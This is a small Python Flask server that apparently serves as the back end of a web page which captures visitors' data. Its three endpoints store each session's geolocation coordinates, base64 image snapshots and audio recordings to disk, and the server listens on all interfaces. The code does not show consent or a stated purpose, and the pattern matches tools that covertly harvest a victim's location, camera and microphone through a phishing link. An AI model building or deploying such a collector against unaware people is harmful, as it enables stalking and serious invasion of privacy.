from flask import Flask, request, render_template_string
import os
import base64
import time

app = Flask(__name__)

# --- Generate or get session folder ---
def get_session_folder(session_id):
    folder = f"data/session_{session_id}"
    if not os.path.exists(folder):
        os.makedirs(folder)
    return folder

@app.route('/')
def index():
    return render_template_string(open("template.html", encoding="utf-8").read())

@app.route('/send_location/<session_id>', methods=['POST'])
def receive_location(session_id):
    data = request.json
    folder = get_session_folder(session_id)
    with open(os.path.join(folder, 'locations.txt'), 'a') as f:
        f.write(f"Lat: {data['lat']}, Lon: {data['lon']}\n")
    print(f"✅ Location saved to {folder}/locations.txt")
    return "Location saved"

@app.route('/send_image/<session_id>', methods=['POST'])
def receive_image(session_id):
    data = request.json
    image_data = data['image'].split(",")[1]
    img_bytes = base64.b64decode(image_data)
    timestamp = int(time.time() * 1000)
    folder = get_session_folder(session_id)
    filename = os.path.join(folder, f"image_{timestamp}.png")
    with open(filename, 'wb') as f:
        f.write(img_bytes)
    print(f"✅ Image saved as {filename}")
    return "Image saved"

@app.route('/send_audio/<session_id>', methods=['POST'])
def receive_audio(session_id):
    data = request.data
    timestamp = int(time.time() * 1000)
    folder = get_session_folder(session_id)
    filename = os.path.join(folder, f"audio_{timestamp}.webm")
    with open(filename, 'wb') as f:
        f.write(data)
    print(f"✅ Audio saved as {filename}")
    return "Audio saved"

if __name__ == '__main__':
    if not os.path.exists('data'):
        os.makedirs('data')
    app.run(host='0.0.0.0', port=5000)
